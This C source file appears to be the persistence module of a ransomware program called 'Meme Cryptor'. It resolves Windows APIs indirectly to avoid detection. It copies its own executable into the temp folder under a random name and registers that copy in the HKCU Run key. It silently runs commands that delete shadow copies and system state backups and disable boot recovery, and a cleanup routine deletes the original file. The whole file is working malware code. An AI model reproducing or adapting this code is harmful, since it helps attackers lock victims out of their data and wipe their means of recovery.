#include "Persistent.h"
#include "Crypto.h"
#include "wbemcli.h"
#include "oleauto.h"

LPCSTR tempFile_path;

extern FARPROC APIArray[52];

MemeCopyFileA TempCopyFileA1;
MemeGetTempPathA TempGetTempPathA1;
MemeGetModuleFileNameA TempGetModuleFileNameA1;
MemeRegOpenKeyExA TempRegOpenKeyExA1;
MemeRegSetKeyValueA TempRegSetKeyValueA1;
MemeShellExecuteA TempShellExecuteA1;
MemeCryptReleaseContext TempCryptReleaseContext1;
MemeCryptGenRandom TempCryptGenRandom1;

void populateApiPersist() {
	TempCopyFileA1 = (MemeCopyFileA)APIArray[15];
	TempGetTempPathA1 = (MemeGetTempPathA)APIArray[3];
	TempGetModuleFileNameA1 = (MemeGetModuleFileNameA)APIArray[24];
	TempRegOpenKeyExA1 = (MemeRegOpenKeyExA)APIArray[39];
	TempRegSetKeyValueA1 = (MemeRegSetKeyValueA)APIArray[40];
	TempShellExecuteA1 = (MemeShellExecuteA)APIArray[49];
	TempCryptReleaseContext1 = (MemeCryptReleaseContext)APIArray[41];
	TempCryptGenRandom1 = (MemeCryptGenRandom)APIArray[37];
}

int createTemp(HCRYPTPROV hCryptProv) {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	BYTE* randomBuffer = (BYTE*)calloc(16, 1);

	int return_val = -1;
	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpCurrentFileName) {
		goto CLEANUP;
	}
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!randomBuffer) {
		goto CLEANUP;
	}

	if (!TempGetTempPathA1(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	if (!TempGetModuleFileNameA1(0, lpCurrentFileName, MAX_PATH)) {
		goto CLEANUP;
	}

	if (!TempCryptGenRandom1(hCryptProv, 15, randomBuffer)) {
		goto CLEANUP;
	}

	for (int i = 0; i < 15; i++) {
		randomBuffer[i] = (randomBuffer[i] % 26) + 65;

	}
	randomBuffer[15] = 0;
	strcat(lpTemp, (LPSTR)randomBuffer);
	strcat(lpTemp, ".exe");

	if (!TempCopyFileA1(lpCurrentFileName, lpTemp, TRUE)) {
		goto CLEANUP;
	}

	return_val = 0;
	tempFile_path = lpTemp;
CLEANUP:
	if (randomBuffer) {
		free(randomBuffer);
	}
	if (lpCurrentFileName) {
		free(lpCurrentFileName);
	}
	return return_val;
}

int persistRegistry() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	HKEY hKey;
	if (TempRegOpenKeyExA1(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		return -1;
	}
	if (TempRegSetKeyValueA1(hKey, NULL, "Meme Cryptor", REG_SZ, tempFile_path, strlen(tempFile_path)) != ERROR_SUCCESS) {
		return -1;
	}
	return 0;

}

int environmentSetup() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	LPCSTR command = "/C wmic SHADOWCOPY DELETE ; wbadmin DELETE SYSTEMSTATEBACKUP ; bcdedit.exe / set{ default } bootstatuspolicy ignoreallfailures ; bcdedit.exe / set{ default } recoveryenabled No";

	if ((int)TempShellExecuteA1(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
		return -1;
	}
	return 0;
}

int mainPersist() {
	HCRYPTPROV hCryptProv;
	if (!TempCopyFileA1) {
		populateApiPersist();
	}


	if (acquireContext(&hCryptProv) == -1) {
		goto CLEANUP;
	}
	if (createTemp(hCryptProv) == -1) {
		goto CLEANUP;
	}

	if (persistRegistry() == -1) {
		goto CLEANUP;
	}

	if (environmentSetup() == -1) {

		goto CLEANUP;
	}

CLEANUP:
	if (hCryptProv) {
		TempCryptReleaseContext1(hCryptProv, 0);
	}
	return 0;
}

void persistCleanUp() {
	if (!TempCopyFileA1) {
		populateApiPersist();
	}
	if (tempFile_path) {
		free((void*)tempFile_path);
	}

	LPCSTR command = "/C \"powershell -command Start-Sleep -s 1 ; Remove-Item %s\"";

	LPSTR commandBuffer = (LPSTR)calloc(300, 1);

	if (!commandBuffer) {
		return;
	}

	LPSTR fileNameBuffer = (LPSTR)calloc(260, 1); // MAXPATH

	if (!fileNameBuffer) {
		return;
	}
	TempGetModuleFileNameA1(NULL, fileNameBuffer, 260);

	sprintf(commandBuffer, command, fileNameBuffer);
	TempShellExecuteA1(0, "open", "cmd.exe", commandBuffer, 0, SW_HIDE);
}